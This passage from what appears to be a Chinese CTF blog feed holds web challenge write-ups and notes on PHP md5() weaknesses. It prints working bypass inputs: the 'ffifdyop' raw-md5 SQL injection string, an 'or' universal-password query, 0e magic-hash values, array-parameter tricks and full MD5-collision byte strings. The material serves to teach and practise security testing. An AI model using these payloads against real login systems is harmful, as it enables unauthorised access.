class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>openresty<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Sun, 18 Apr 2021 13:16:12 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=UTF-8<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Hint</span><span class="hljs-punctuation">: </span>select * from &#x27;admin&#x27; where password=md5($pass,true)<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>PHP/7.3.13<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>3107<br></code></pre></div></td></tr></table></figure><p>Hint部分即为提示</p><p>查看md5的函数是否有漏洞</p><p>经过查询若我们可找到字符串，在对该字符串进行md5后能够得到 ‘or’加上一个非0的字符就可以绕过。这里我们可以用到的字符串为：ffifdyop。</p><p>它的md5结果是：276f722736c95d99e921722cf9ed621c 。</p><p>通过这个结果我们可以发现得到16字节的二进制被解析为字符的结果是:’or’6后面接乱码 (27是单引号的16进制编码，67是字母o的16进制…)这样后构造的sql语句就为</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">where</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27; &#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;6***&#x27;</span><br></code></pre></div></td></tr></table></figure><p>将该值放入进入到下一个界面</p><p>相同步骤，先查看源码</p><p>发现如下</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">$a = $GET[&#x27;a&#x27;];</span><br><span class="hljs-comment">$b = $_GET[&#x27;b&#x27;];</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="hljs-comment">    // wow, glzjin wants a girl friend.</span><br><span class="hljs-comment">--&gt;</span><br></code></pre></div></td></tr></table></figure><p>需要相同的md5根据之前查询的md5知识：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]<br>MD5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) == MD5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br></code></pre></div></td></tr></table></figure><p>要求满足上述条件则<br>那么要求name和password数值不同但是MD5相同，在这里可以利用绕过。<br>PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。</p><p><strong>以下值在md5加密后以0E开头：</strong></p><ul><li>QNKCDZO</li><li>240610708</li><li>s878926199a</li><li>s155964671a</li><li>s214587387a</li><li>s214587387a</li></ul><p><strong>以下值在sha1加密后以0E开头：</strong></p><ul><li>sha1(‘aaroZmOk’)</li><li>sha1(‘aaK1STfY’)</li><li>sha1(‘aaO8zKZF’)</li><li>sha1(‘aa3OFF9m’)</li></ul><p>GET传入<code>a=QNKCDZO&amp;b=240610708</code>就能绕过了</p><p>以及</p><p><strong>PHP中md5的函数特性</strong></p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">md5([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]) == md5([<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]) == <span class="hljs-literal">NULL</span><br></code></pre></div></td></tr></table></figure><p>[1] !== [2] &amp;&amp; md5([1]) === md5([2])<br>所以GET传入<code>a[]=1&amp;b[]=2</code>就能够绕过了。</p><p>输入后跳转至下一个界面</p><p>相同的不过使用了三等于并且是post</p>]]></content>
    
    
    <categories>
      
      <category>信安 CTF Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
      <tag>md5</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php md5</title>
    <link href="/2021/04/18/%E4%BF%A1%E5%AE%89/CTF/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/php%20md5/"/>
    <url>/2021/04/18/%E4%BF%A1%E5%AE%89/CTF/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/php%20md5/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP-MD5"><a href="#PHP-MD5" class="headerlink" title="PHP MD5"></a>PHP MD5</h1><h1 id="CTF中常见php-MD5-函数漏洞"><a href="#CTF中常见php-MD5-函数漏洞" class="headerlink" title="CTF中常见php-MD5()函数漏洞"></a>CTF中常见php-MD5()函数漏洞</h1><h3 id="1-数字与字符串之间的比较"><a href="#1-数字与字符串之间的比较" class="headerlink" title="1.数字与字符串之间的比较"></a>1.数字与字符串之间的比较</h3><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">var_dump( <span class="hljs-number">0</span> == <span class="hljs-string">&quot;a&quot;</span> );<br>var_dump( <span class="hljs-string">&quot;0&quot;</span> == <span class="hljs-string">&quot;a&quot;</span> );<br></code></pre></div></td></tr></table></figure><p>第一个返回的是 true ，第二个返回的是 false<br>因为php把字母开头的转化为整型时，转化为0， 前面数字后面字母的话就只取到第一个字母出现的位置之前（如intval(’’123abd45gf)结果为123）</p><h3 id="2-MD5函数漏洞"><a href="#2-MD5函数漏洞" class="headerlink" title="2.MD5函数漏洞"></a>2.MD5函数漏洞</h3><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]<br>MD5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) == MD5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br></code></pre></div></td></tr></table></figure><p>要求满足上述条件则<br>那么要求name和password数值不同但是MD5相同，在这里可以利用绕过。<br>PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。</p><p><strong>以下值在md5加密后以0E开头：</strong></p><ul><li>QNKCDZO</li><li>240610708</li><li>s878926199a</li><li>s155964671a</li><li>s214587387a</li><li>s214587387a</li><li>0e000000000000000000000329568726</li></ul><p><strong>以下MD5加密后0E开头且再次加密也是0E开头</strong>：</p><ul><li>V5VDSHva7fjyJoJ33IQl</li><li>CbDLytmyGm2xQyaLNhWn</li></ul><p><strong>以下值在sha1加密后以0E开头：</strong></p><ul><li>sha1(‘aaroZmOk’)</li><li>sha1(‘aaK1STfY’)</li><li>sha1(‘aaO8zKZF’)</li><li>sha1(‘aa3OFF9m’)</li></ul><p>GET传入<code>a=QNKCDZO&amp;b=240610708</code>就能绕过了</p><h3 id="3-php特性"><a href="#3-php特性" class="headerlink" title="3.php特性"></a>3.php特性</h3><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>] &amp;&amp; md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>])===md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;success!&quot;</span>);<br>    &#125;<br></code></pre></div></td></tr></table></figure><p>在php中===为完全等于运算，不仅比较<strong>值</strong>，而且还比较值的<strong>类型</strong>，只有<strong>两者一致</strong>才为真。再次使用a=QNKCDZO&amp;b=240610708就不行了，因为a和b类型不同。</p><p><strong>PHP中md5的函数特性</strong></p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">md5([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]) == md5([<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]) == <span class="hljs-literal">NULL</span><br></code></pre></div></td></tr></table></figure><p>[1] !== [2] &amp;&amp; md5([1]) === md5([2])<br>所以GET传入<code>a[]=1&amp;b[]=2</code>就能够绕过了。</p><h3 id="4-MD5碰撞"><a href="#4-MD5碰撞" class="headerlink" title="4.MD5碰撞"></a>4.MD5碰撞</h3><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">if</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>]!==(<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>] &amp;&amp; md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>])===md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;success!);</span><br><span class="hljs-string">&#125;</span><br></code></pre></div></td></tr></table></figure><p>要求构造param1和param2不同，但是MD5相同，也就是说要求传入两个MD5相同的不同字符串。</p><figure class="highlight gcode"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gcode">Para<span class="hljs-name">m1</span>=<span class="hljs-meta">%</span><span class="hljs-number">4</span>d<span class="hljs-meta">%</span>c<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">68</span><span class="hljs-meta">%</span>ff<span class="hljs-meta">%</span><span class="hljs-number">0</span>e<span class="hljs-meta">%</span>e<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">5</span>c<span class="hljs-meta">%</span><span class="hljs-number">20</span><span class="hljs-meta">%</span><span class="hljs-number">95</span><span class="hljs-meta">%</span><span class="hljs-number">72</span><span class="hljs-meta">%</span>d<span class="hljs-number">4</span><span class="hljs-meta">%</span><span class="hljs-number">77</span><span class="hljs-meta">%</span><span class="hljs-number">7</span>b<span class="hljs-meta">%</span><span class="hljs-number">72</span><span class="hljs-meta">%</span><span class="hljs-number">15</span><span class="hljs-meta">%</span><span class="hljs-number">87</span><span class="hljs-meta">%</span>d<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">6</span>f<span class="hljs-meta">%</span>a<span class="hljs-number">7</span><span class="hljs-meta">%</span>b<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">1</span>b<span class="hljs-meta">%</span>dc<span class="hljs-meta">%</span><span class="hljs-number">56</span><span class="hljs-meta">%</span>b<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">4</span>a<span class="hljs-meta">%</span><span class="hljs-number">3</span>d<span class="hljs-meta">%</span>c<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">78</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>e<span class="hljs-meta">%</span><span class="hljs-number">7</span>b<span class="hljs-meta">%</span><span class="hljs-number">95</span><span class="hljs-meta">%</span><span class="hljs-number">18</span><span class="hljs-meta">%</span>af<span class="hljs-meta">%</span>bf<span class="hljs-meta">%</span>a<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span>a<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">28</span><span class="hljs-meta">%</span><span class="hljs-number">4</span>b<span class="hljs-meta">%</span>f<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">6</span>e<span class="hljs-meta">%</span><span class="hljs-number">8</span>e<span class="hljs-meta">%</span><span class="hljs-number">4</span>b<span class="hljs-meta">%</span><span class="hljs-number">55</span><span class="hljs-meta">%</span>b<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">5</span>f<span class="hljs-meta">%</span><span class="hljs-number">42</span><span class="hljs-meta">%</span><span class="hljs-number">75</span><span class="hljs-meta">%</span><span class="hljs-number">93</span><span class="hljs-meta">%</span>d<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">49</span><span class="hljs-meta">%</span><span class="hljs-number">67</span><span class="hljs-meta">%</span><span class="hljs-number">6</span>d<span class="hljs-meta">%</span>a<span class="hljs-number">0</span><span class="hljs-meta">%</span>d<span class="hljs-number">1</span><span class="hljs-meta">%</span><span class="hljs-number">55</span><span class="hljs-meta">%</span><span class="hljs-number">5</span>d<span class="hljs-meta">%</span><span class="hljs-number">83</span><span class="hljs-meta">%</span><span class="hljs-number">60</span><span class="hljs-meta">%</span>fb<span class="hljs-meta">%</span><span class="hljs-number">5</span>f<span class="hljs-meta">%</span><span class="hljs-number">07</span><span class="hljs-meta">%</span>fe<span class="hljs-meta">%</span>a<span class="hljs-number">2</span><br>Para<span class="hljs-name">m2</span>=<span class="hljs-meta">%</span><span class="hljs-number">4</span>d<span class="hljs-meta">%</span>c<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">68</span><span class="hljs-meta">%</span>ff<span class="hljs-meta">%</span><span class="hljs-number">0</span>e<span class="hljs-meta">%</span>e<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">5</span>c<span class="hljs-meta">%</span><span class="hljs-number">20</span><span class="hljs-meta">%</span><span class="hljs-number">95</span><span class="hljs-meta">%</span><span class="hljs-number">72</span><span class="hljs-meta">%</span>d<span class="hljs-number">4</span><span class="hljs-meta">%</span><span class="hljs-number">77</span><span class="hljs-meta">%</span><span class="hljs-number">7</span>b<span class="hljs-meta">%</span><span class="hljs-number">72</span><span class="hljs-meta">%</span><span class="hljs-number">15</span><span class="hljs-meta">%</span><span class="hljs-number">87</span><span class="hljs-meta">%</span>d<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">6</span>f<span class="hljs-meta">%</span>a<span class="hljs-number">7</span><span class="hljs-meta">%</span>b<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">1</span>b<span class="hljs-meta">%</span>dc<span class="hljs-meta">%</span><span class="hljs-number">56</span><span class="hljs-meta">%</span>b<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">4</span>a<span class="hljs-meta">%</span><span class="hljs-number">3</span>d<span class="hljs-meta">%</span>c<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">78</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>e<span class="hljs-meta">%</span><span class="hljs-number">7</span>b<span class="hljs-meta">%</span><span class="hljs-number">95</span><span class="hljs-meta">%</span><span class="hljs-number">18</span><span class="hljs-meta">%</span>af<span class="hljs-meta">%</span>bf<span class="hljs-meta">%</span>a<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">02</span><span class="hljs-meta">%</span>a<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">28</span><span class="hljs-meta">%</span><span class="hljs-number">4</span>b<span class="hljs-meta">%</span>f<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">6</span>e<span class="hljs-meta">%</span><span class="hljs-number">8</span>e<span class="hljs-meta">%</span><span class="hljs-number">4</span>b<span class="hljs-meta">%</span><span class="hljs-number">55</span><span class="hljs-meta">%</span>b<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">5</span>f<span class="hljs-meta">%</span><span class="hljs-number">42</span><span class="hljs-meta">%</span><span class="hljs-number">75</span><span class="hljs-meta">%</span><span class="hljs-number">93</span><span class="hljs-meta">%</span>d<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">49</span><span class="hljs-meta">%</span><span class="hljs-number">67</span><span class="hljs-meta">%</span><span class="hljs-number">6</span>d<span class="hljs-meta">%</span>a<span class="hljs-number">0</span><span class="hljs-meta">%</span>d<span class="hljs-number">1</span><span class="hljs-meta">%</span>d<span class="hljs-number">5</span><span class="hljs-meta">%</span><span class="hljs-number">5</span>d<span class="hljs-meta">%</span><span class="hljs-number">83</span><span class="hljs-meta">%</span><span class="hljs-number">60</span><span class="hljs-meta">%</span>fb<span class="hljs-meta">%</span><span class="hljs-number">5</span>f<span class="hljs-meta">%</span><span class="hljs-number">07</span><span class="hljs-meta">%</span>fe<span class="hljs-meta">%</span>a<span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure><p>MD5值相同使用谷歌可以搜到相当多被巧妙构造出的二进制文件，其MD5相同，注意一点，post时一定要urlencode！！！</p><figure class="highlight perl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs perl">$s1 = <span class="hljs-string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;<br>$s2 = <span class="hljs-string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;</span>;<br>$s3 = <span class="hljs-string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;<br></code></pre></div></td></tr></table></figure><h2 id="md5-password-true-的SQL注入问题"><a href="#md5-password-true-的SQL注入问题" class="headerlink" title="md5($password,true)的SQL注入问题"></a>md5($password,true)的SQL注入问题</h2><p>这里需要注意一下MYSQL中的一些数值比较的特征。</p><p>1.当数字和字符串比较时，若字符串的数字部分（需要从头开始）和数字是相同的，那么则返回的是true。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">select <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-string">&quot;1a&quot;</span>,<span class="hljs-string">&quot;相等&quot;</span>,<span class="hljs-string">&quot;不相等&quot;</span>) <span class="hljs-keyword">as</span> test<br></code></pre></div></td></tr></table></figure><p>if（exp1,stat1,stat2）:类似于高级语言中三元运算符。当exp1为true的是否返回stat1，为false返回stat2</p><p><img src="https://img-blog.csdnimg.cn/20200512173718683.JPG"></p><p>2.以数字开头的字符串，若开头的字符不是0，那么在做逻辑运算的时候返回的是1，也就是true。</p><p>比如以下语句就是一个万能密码的例子：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> password <span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;1234a&#x27;</span>;<br></code></pre></div></td></tr></table></figure><p>解释一下：’1234a’会被当做true对待。而任何数和true做逻辑或运算返回的值都是true.</p><p>看这个md5($password,true)的漏洞</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> usera <span class="hljs-keyword">where</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> password <span class="hljs-operator">=</span> md5($pass,<span class="hljs-literal">true</span>)<br></code></pre></div></td></tr></table></figure><p>若我们可找到字符串，在对该字符串进行md5后能够得到 ‘or’加上一个非0的字符就可以绕过。这里我们可以用到的字符串为：ffifdyop。</p><p>它的md5结果是：276f722736c95d99e921722cf9ed621c 。</p><p>通过这个结果我们可以发现得到16字节的二进制被解析为字符的结果是:’or’6后面接乱码 (27是单引号的16进制编码，67是字母o的16进制…)这样后构造的sql语句就为</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27; &#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;6xxx&#x27;</span><br></code></pre></div></td></tr></table></figure><p>和上面分析的万能密码是一致的。</p>]]></content>
    
    
    <categories>
      
      <category>信安 CTF 相关知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>极客大挑战 2019_BuyFlag 1</title>
    <link href="/2021/04/18/%E4%BF%A1%E5%AE%89/CTF/Web/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DBuyFlag%201/"/>
    <url>/2021/04/18/%E4%BF%A1%E5%AE%89/CTF/Web/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DBuyFlag%201/</url>
    
